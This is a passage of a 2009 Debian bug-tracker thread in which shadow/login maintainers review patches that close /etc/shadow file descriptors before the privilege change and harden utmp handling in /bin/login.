(Sun, 19 Apr 2009 05:27:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=153), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=153), [link](#152)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 19 Apr 2009 05:27:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=155), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=155), [link](#154)).

---

[Message #156](#156) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=156), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=156), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sun, 19 Apr 2009 15:23:44 +1000
```
Dear Nicolas,

> ... Do these [entspent] moves warrant a DSA?

Maybe not. Testing, it seems that getspnam() does not leave an open file
descriptor, but setspent() would. (I do not know what /bin/login does
exactly.)

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 19 Apr 2009 13:00:09 GMT) ([full text](bugreport.cgi?bug=505071;msg=158), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=158), [link](#157)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 19 Apr 2009 13:00:09 GMT) ([full text](bugreport.cgi?bug=505071;msg=160), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=160), [link](#159)).

---

[Message #161](#161) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=161), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=161), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sun, 19 Apr 2009 22:53:50 +1000
```
Dear Nicolas,

I wrote:

>> ... Do these [entspent] moves warrant a DSA?
> Maybe not. Testing, it seems that getspnam() does not leave an open file
> descriptor, but setspent() would. (I do not know what /bin/login does
> exactly.)

Now testing, seems that just before the endspent() etc calls, login has
a file descriptor open on /etc/passwd but does not have one for
/etc/shadow. Seems there is no security issue. (Is this weird behaviour
in libc?)

Since I do not know how getspent() or endspent() work, I now wonder
whether chunks of /etc/shadow (other than the line for right user) could
be found in process memory, before or after endspent(). Have so far
failed to read /proc/self/mem in my test program, and wonder if that
feature works in my kernel...

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 19 Apr 2009 13:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=163), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=163), [link](#162)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 19 Apr 2009 13:48:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=165), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=165), [link](#164)).

---

[Message #166](#166) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=166), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=166), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Sun, 19 Apr 2009 15:47:11 +0200
```
Hello,

On Sun, Apr 19, 2009 at 09:06:38AM +1000, psz@maths.usyd.edu.au wrote:
>
> Thanks. New patches (replacing my previous ones) below, including the
> move of endpwent(), and more verbose comments. The patch for login.c
> is essential. The patch for utmp.c is mostly "as you wish"; there is a
> missed endutent() there, am not sure whether correct or how important.

I've added the missing endutent / endutxent.

> Seems to me that su.c needs endgrent() for when SU_WHEEL_ONLY (this is
> not a security issue).
>
> In newgrp.c also, endpwent() needs to be moved to before the UID/GID
> change (as was in login.c); I do not give patches. - Do these moves
> warrant a DSA?

I don't think there is a need for a DSA.
With a glibc, the user/group databases are opened with the O_CLOEXEC flag.
The file descriptor will not be available to the exec'ed processes.

Regarding login.c, I think it is still fine to "close" the files (with
endspent et al.), in case another implementation is used.

This still have to be checked / done.

Here are some comments on the patches:

>  	amroot = (getuid () == 0);
>  	Prog = Basename (argv[0]);
> +	/*
> +	 * PSz 18 Apr 09 Will this "work" unless we are root?
> +	 * Should we test
> +	if (geteuid() != 0) {
> +		fprintf (stderr, _("%s: Cannot possibly work without effective root\n"), Prog);
> +		exit (1);
> +	}
> +	 * ?
> +	 * Debian /bin/login is not setuid, cannot work without amroot.
> +	 */

Debian used to have a setuid /bin/login. Some people may still want to
have it setuid, so I would prefer to avoid requiring to run login as root.

>  	 * even if your getty is broken, or if something corrupts utmp,
>  	 * but users must "exec login" which will use the existing utmp
>  	 * entry (will not overwrite remote hostname).  --marekm
> +	 * PSz 18 Apr 09 As seen in
> +	 *   <http://bugs.debian.org/505071>
> +	 *   <http://bugs.debian.org/505271>
> +	 * we cannot trust utmp: should set our own, new entry.
> +	 * On Debian at least, we will never succeed without amroot
> +	 * (should have exited already?), should never be picky...
>  	 */
>  	checkutmp (!amroot);

My point would be: In case login is setuid, shall we require that it is
called with "exec login". That would be my preference.

Then, how to enforce this? (note the point is not to enforce this is all
cases, but to make sure regular user will not leave a opened session).

It might be better to change the login/utmp logic to:

	if (!amroot)
		checkutmp (); /* Make sure there is a valid enough entry
		               * in utmp */

	getutmp (&utent);      /* get the sanitized existing utmp entry or
	                        * default entry */
#if USE_UTMPX
	getutmpx (&utxent);
#endif

	...

	setutmp (&utent);
#if USE_UTMPX
	setutmpx (&utxent);
#endif

That could remove the need for __linux__ in utmp.c and would remove the
global utent and utxent.

>  	/*
>  	 * hostname & tty are either set to NULL or their correct values,
>  	 * depending on how much we know.
> +	 * PSz 18 Apr 09 PAM_RHOST and PAM_TTY must be kept safe:
> +	 * PAM_RHOST is used e.g. in pam_rhosts_auth. We only ever set
> +	 * hostname from rflg or hflg not from ut_host, so is safe.
> +	 * PAM_TTY is used e.g. in pam_time and pam_group. We set tty
> +	 * from ttyname not from ut_line, so is safe.
>  	 */

I agree on putting a comment here to avoid setting PAM_RHOST differently in
future.

(The other comments were not meant to appear in the code, right?)

> --- libmisc/utmp.c.old	2008-11-23 10:56:10.000000000 +1100
> +++ libmisc/utmp.c	2009-04-19 08:09:22.000000000 +1000
> @@ -68,17 +68,27 @@
>  		snprintf (full_tty, sizeof full_tty, "/dev/%s", tty);
>  		tty = full_tty;
>  	}
> -
> -	if (   (stat (tty, &by_name) != 0)
> -	    || (fstat (STDIN_FILENO, &by_fd) != 0)) {
> -		return false;
> -	}
> -
> -	if (by_name.st_rdev != by_fd.st_rdev) {
> +	/*
> +	 * PSz 19 Apr 09 Might as well just compare to ttyname():
> +	 * code below may be too complex (or unsafe/raceable).
> +	 */
> +	if (strcmp(tty,ttyname(0))) {
>  		return false;
>  	} else {
>  		return true;
>  	}

Let's do it, but I'm still unsure about the consequences of this.
i.e. was it a feature to be able to have a getty using a device not in
/dev

Let's see if somebody notices and complains.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 19 Apr 2009 15:48:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=168), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=168), [link](#167)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 19 Apr 2009 15:48:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=170), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=170), [link](#169)).

---

[Message #171](#171) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=171), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=171), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Sun, 19 Apr 2009 17:47:35 +0200
```
On Sun, Apr 19, 2009 at 10:53:50PM +1000, psz@maths.usyd.edu.au wrote:
>
> Now testing, seems that just before the endspent() etc calls, login has
> a file descriptor open on /etc/passwd but does not have one for
> /etc/shadow. Seems there is no security issue. (Is this weird behaviour
> in libc?)

There are no call to setspent or getspent in shadow, so I'm not really
surprised.

> Since I do not know how getspent() or endspent() work, I now wonder
> whether chunks of /etc/shadow (other than the line for right user) could
> be found in process memory, before or after endspent(). Have so far
> failed to read /proc/self/mem in my test program, and wonder if that
> feature works in my kernel...

Only getspnam would have to be checked.
The problem probably depends on the libc.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 19 Apr 2009 21:46:13 GMT) ([full text](bugreport.cgi?bug=505071;msg=173), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=173), [link](#172)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 19 Apr 2009 21:46:37 GMT) ([full text](bugreport.cgi?bug=505071;msg=175), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=175), [link](#174)).

---

[Message #176](#176) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=176), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=176), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Mon, 20 Apr 2009 07:35:57 +1000
```
Dear Nicolas,

> I've added the missing endutent / endutxent.

Thanks.

>> Seems to me that su.c needs endgrent() for when SU_WHEEL_ONLY (this is
>> not a security issue).
>>
>> In newgrp.c also, endpwent() needs to be moved to before the UID/GID
>> change (as was in login.c); I do not give patches. - Do these moves
>> warrant a DSA?
>
> I don't think there is a need for a DSA.
> With a glibc, the user/group databases are opened with the O_CLOEXEC flag.
> The file descriptor will not be available to the exec'ed processes.
>
> Regarding login.c, I think it is still fine to "close" the files (with
> endspent et al.), in case another implementation is used.
>
> This still have to be checked / done.

Once you change UID, the user may interact with the process; the file
descriptor must be closed before the user gets a chance. Anyway you must
not rely on O_CLOEXEC that you did not set yourself. (Admittedly, the
window of opportunity between setuid and endspent is small, and it may
be hard to interact with a process that just gave up privileges so is
not yet "fully" user. But, races are easy to win.)

There may be no need for DSA, because in fact login never had a file
descriptor for /etc/shadow. Other (non-Debian) machines may have a
different libc and not so lucky.

> Here are some comments on the patches:
>
>>  	amroot = (getuid () == 0);
>>  	Prog = Basename (argv[0]);
>> +	/*
>> +	 * PSz 18 Apr 09 Will this "work" unless we are root?
>> +	 * Should we test
>> +	if (geteuid() != 0) {
>> +		fprintf (stderr, _("%s: Cannot possibly work without effective root\n"), Prog);
>> +		exit (1);
>> +	}
>> +	 * ?
>> +	 * Debian /bin/login is not setuid, cannot work without amroot.
>> +	 */
>
> Debian used to have a setuid /bin/login. Some people may still want to
> have it setuid, so I would prefer to avoid requiring to run login as root.

The above would check EUID, would allow that (if uncommented).

> My point would be: In case login is setuid, shall we require that it is
> called with "exec login". That would be my preference.
>
> Then, how to enforce this? (note the point is not to enforce this is all
> cases, but to make sure regular user will not leave a opened session).
>
> It might be better to change the login/utmp logic to:
>
> 	if (!amroot)
> 		checkutmp (); /* Make sure there is a valid enough entry
> 		               * in utmp */
>
> 	getutmp (&utent);      /* get the sanitized existing utmp entry or
> 	                        * default entry */
> #if USE_UTMPX
> 	getutmpx (&utxent);
> #endif
>
> 	...
>
> 	setutmp (&utent);
> #if USE_UTMPX
> 	setutmpx (&utxent);
> #endif
>
> That could remove the need for __linux__ in utmp.c and would remove the
> global utent and utxent.

Sorry but I do not know. (I guess that would be OK, with plenty of
checking/sanitizing after getutmp(), not assuming that it would return
the just-checked entry, but double-checking to make sure.)

>>  	/*
>>  	 * hostname & tty are either set to NULL or their correct values,
>>  	 * depending on how much we know.
>> +	 * PSz 18 Apr 09 PAM_RHOST and PAM_TTY must be kept safe:
>> +	 * PAM_RHOST is used e.g. in pam_rhosts_auth. We only ever set
>> +	 * hostname from rflg or hflg not from ut_host, so is safe.
>> +	 * PAM_TTY is used e.g. in pam_time and pam_group. We set tty
>> +	 * from ttyname not from ut_line, so is safe.
>>  	 */
>
> I agree on putting a comment here to avoid setting PAM_RHOST differently in
> future.

Thanks.

> (The other comments were not meant to appear in the code, right?)

I do not know. I like comments, for when (others?) reviewing the code.

>> --- libmisc/utmp.c.old	2008-11-23 10:56:10.000000000 +1100
>> +++ libmisc/utmp.c	2009-04-19 08:09:22.000000000 +1000
>> @@ -68,17 +68,27 @@
>>  		snprintf (full_tty, sizeof full_tty, "/dev/%s", tty);
>>  		tty = full_tty;
>>  	}
>> -
>> -	if (   (stat (tty, &by_name) != 0)
>> -	    || (fstat (STDIN_FILENO, &by_fd) != 0)) {
>> -		return false;
>> -	}
>> -
>> -	if (by_name.st_rdev != by_fd.st_rdev) {
>> +	/*
>> +	 * PSz 19 Apr 09 Might as well just compare to ttyname():
>> +	 * code below may be too complex (or unsafe/raceable).
>> +	 */
>> +	if (strcmp(tty,ttyname(0))) {
>>  		return false;
>>  	} else {
>>  		return true;
>>  	}
>
> Let's do it, but I'm still unsure about the consequences of this.
> i.e. was it a feature to be able to have a getty using a device not in
> /dev

Thanks.

>> Now testing, seems that just before the endspent() etc calls, login has
>> a file descriptor open on /etc/passwd but does not have one for
>> /etc/shadow. Seems there is no security issue. (Is this weird behaviour
>> in libc?)
>
> There are no call to setspent or getspent in shadow, so I'm not really
> surprised.

But... I do not see setpwent() either within /bin/login sources (though
is in the binary), and /etc/passwd is open; the man pages suggest that
both /etc/passwd and /etc/shadow should be open "internally" until
endXXent, even without explicit setXXent.

>> Since I do not know how getspent() or endspent() work, I now wonder
>> whether chunks of /etc/shadow (other than the line for right user) could
>> be found in process memory, before or after endspent(). Have so far
>> failed to read /proc/self/mem in my test program, and wonder if that
>> feature works in my kernel...
>
> Only getspnam would have to be checked.
> The problem probably depends on the libc.

Yes. Would be nice for getspnam() to scrub memory areas; surely
endspent() should. (Tried looking in libc sources, and got confused...)
Since login uses these, it should make sure they do the "right thing"
(maybe by doing the memory scrubbing itself).

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 21 Apr 2009 08:27:09 GMT) ([full text](bugreport.cgi?bug=505071;msg=178), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=178), [link](#177)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 21 Apr 2009 08:27:09 GMT) ([full text](bugreport.cgi?bug=505071;msg=180), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=180), [link](#179)).

---

[Message #181](#181) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=181), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=181), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Tue, 21 Apr 2009 18:24:06 +1000
```
I now got my /proc/self/mem-reading test program to work, and it
seems that neither getspnam() nor getspent() leave "garbage" in
memory: no security risk. - Am wondering if the call to endspent()
is needed, when apparently there is no setspent() anywhere; still,
it can do no harm (other than to confuse fools like me).

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Tue, 21 Apr 2009 22:54:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=183), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=183), [link](#182)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 21 Apr 2009 22:54:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=185), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=185), [link](#184)).

---

[Message #186](#186) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=186), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=186), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au, 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Wed, 22 Apr 2009 00:52:06 +0200
```
Hello,

I've committed a new utmp handling for login.
I also hope it fixes other concerns raised in the thread.

I would appreciate if you could have a look:
<http://svn.debian.org/viewsvn/pkg-shadow/upstream/trunk/>

Thanks in advance,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Wed, 22 Apr 2009 00:42:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=188), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=188), [link](#187)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 22 Apr 2009 00:42:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=190), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=190), [link](#189)).

---

[Message #191](#191) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=191), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=191), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Wed, 22 Apr 2009 10:41:21 +1000
```
Dear Nicolas,

Had a quick look at src/login.c and libmisc/utmp.c, and see the "plain"
(not security) issues below. - The enspent() block should be moved up
in newgrp.c also.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

--- login.c.bak	2009-04-22 09:34:08.000000000 +1000
+++ login.c	2009-04-22 10:32:53.000000000 +1000
@@ -533,6 +533,7 @@
 		(void) puts (_("No utmp entry.  You must exec \"login\" from the lowest level \"sh\""));
 		exit (1);
 	}
+	/* Take note that utent may be NULL after this... */

 	tmptty = ttyname (0);
 	if (NULL == tmptty) {
@@ -625,15 +626,13 @@

 	if (rflg || hflg) {
 		cp = hostname;
-	} else {
 #ifdef	HAVE_STRUCT_UTMP_UT_HOST
-		if ('\0' != utent->ut_host[0]) {
-			cp = utent->ut_host;
-		} else
+/* Take care with utent that may be NULL */
+	} else if (utent != NULL && '\0' != utent->ut_host[0]) {
+		cp = utent->ut_host;
 #endif				/* HAVE_STRUCT_UTMP_UT_HOST */
-		{
-			cp = "";
-		}
+	} else {
+		cp = "";
 	}

 	if ('\0' != *cp) {
--- utmp.c.bak	2009-04-22 09:34:34.000000000 +1000
+++ utmp.c	2009-04-22 10:32:55.000000000 +1000
@@ -93,6 +93,7 @@
  *	Return NULL if no entries exist in utmp for the current process.
  */
 struct utmp *get_current_utmp (void)
+/* May return NULL. Should it return an "empty" (zeroed) something instead? */
 {
 	struct utmp *ut;
 	struct utmp *ret = NULL;
@@ -109,6 +110,13 @@
 		    && (   (LOGIN_PROCESS == ut->ut_type)
 		        || (USER_PROCESS  == ut->ut_type))
 #endif
+/*
+ * We use HAVE_STRUCT_UTMP_UT_ID above (surely utmp has that??!!)
+ * Should we use
+ *   HAVE_STRUCT_UTMP_UT_LINE below, or use
+ *   HAVE_STRUCT_UTMP_UT_PID above
+ * (are defined anywhere?)
+ */
 		    /* A process may have failed to close an entry
 		     * Check if this entry refers to the current tty */
 		    && is_my_tty (ut->ut_line)) {
@@ -117,6 +125,7 @@
 	}

 	if (NULL != ut) {
+		/* malloc, or xmalloc as everywhere else? */
 		ret = malloc (sizeof (*ret));
 		memcpy (ret, ut, sizeof (*ret));
 	}
@@ -200,6 +209,7 @@

 	assert (NULL != name);
 	assert (NULL != line);
+	/* BUG: utent in login.c may be NULL (in prepare_utmpx also) */
 	assert (NULL != ut);

@@ -234,6 +244,7 @@
 	strncpy (utent->ut_line, line,      sizeof (utent->ut_line));
 #ifdef HAVE_STRUCT_UTMP_UT_ID
 	strncpy (utent->ut_id,   ut->ut_id, sizeof (utent->ut_id));
+	/* BUG: set "correct" ut_id based on "line", in case we did not get any (in prepare_utmpx also) */
 #endif				/* HAVE_STRUCT_UTMP_UT_ID */
 #ifdef HAVE_STRUCT_UTMP_UT_NAME
 	strncpy (utent->ut_name, name,      sizeof (utent->ut_name));

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sat, 25 Apr 2009 12:03:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=193), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=193), [link](#192)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 25 Apr 2009 12:03:05 GMT) ([full text](bugreport.cgi?bug=505071;msg=195), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=195), [link](#194)).

---

[Message #196](#196) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=196), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=196), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Sat, 25 Apr 2009 21:57:41 +1000
```
Dear Nicolas,

Comments on (snippet of code comments, and your words):

>>  	 * but users must "exec login" which will use the existing utmp
>>  	 * entry (will not overwrite remote hostname).  --marekm
>
> My point would be: In case login is setuid, shall we require that it is
> called with "exec login". That would be my preference.
>
> Then, how to enforce this? (note the point is not to enforce this is all
> cases, but to make sure regular user will not leave a opened session).

If login is not setuid then it cannot be used in that fashion anyway.
So this is not about current Debian or Ubuntu.

In my experience, if users want something, they will get it with some
"worse" means. If we do not let them run login directly, then they will
run telnet instead which is probably much more wasteful; they will not
use "exec login" or su, because are not familiar with those. There is
not much point in protecting users from own foolishness.

But mainly, "exec login" cannot possibly work in a PAM environment, but
will fail/die and "lose" the user session; users should not be tricked
into doing that. Presumably the user logged in with login (e.g. telnet,
may not apply for ssh or xterm); then login done a fork before running
the shell; any utmp entry refers to the PID of the parent login.
Incidentally, seems rather wasteful to have login waiting to
pam_close_session and telnetd waiting to clear utmp.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 26 Apr 2009 16:42:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=198), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=198), [link](#197)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 26 Apr 2009 16:42:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=200), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=200), [link](#199)).

---

[Message #201](#201) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=201), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=201), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Sun, 26 Apr 2009 18:38:17 +0200
```
On Sat, Apr 25, 2009 at 09:57:41PM +1000, psz@maths.usyd.edu.au wrote:
> Dear Nicolas,
>
> Comments on (snippet of code comments, and your words):
>
> >>  	 * but users must "exec login" which will use the existing utmp
> >>  	 * entry (will not overwrite remote hostname).  --marekm
> >
> > My point would be: In case login is setuid, shall we require that it is
> > called with "exec login". That would be my preference.
> >
> > Then, how to enforce this? (note the point is not to enforce this is all
> > cases, but to make sure regular user will not leave a opened session).
>
> If login is not setuid then it cannot be used in that fashion anyway.
> So this is not about current Debian or Ubuntu.

I would prefer to keep this feature, even if not used on Debian and
Ubuntu. Some users may be relying on it.

> In my experience, if users want something, they will get it with some
> "worse" means. If we do not let them run login directly, then they will
> run telnet instead which is probably much more wasteful; they will not
> use "exec login" or su, because are not familiar with those. There is
> not much point in protecting users from own foolishness.

> But mainly, "exec login" cannot possibly work in a PAM environment, but
> will fail/die and "lose" the user session; users should not be tricked
> into doing that. Presumably the user logged in with login (e.g. telnet,
> may not apply for ssh or xterm); then login done a fork before running
> the shell; any utmp entry refers to the PID of the parent login.

I don't get your point.
At least when login was setuid on debian, "exec login" used to work on PAM
environments.

> Incidentally, seems rather wasteful to have login waiting to
> pam_close_session and telnetd waiting to clear utmp.

What would you recommend?

There are some UNIX where pam_close_session has to be done by the caller
of login. But this requires a general policy to be applied consistently on
many packages. I don't think this will be possible to enforce this on the
tools used in Linux. So having login wait to pam_close_session is
currently the only solution.

Regarding UTMP, I don't know if it would be valid to close the entry on
exit. Even if login did it, I'm also not sure telnetd wouldn't have to do
it again anyway (there are other login implementation).

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 26 Apr 2009 17:30:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=203), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=203), [link](#202)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 26 Apr 2009 17:30:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=205), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=205), [link](#204)).

---

[Message #206](#206) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=206), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=206), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: Paul Szabo <psz@maths.usyd.edu.au>, 505071@bugs.debian.org
Subject: Re: Bug#505071: closed ... fixed in shadow 1:4.1.3-1
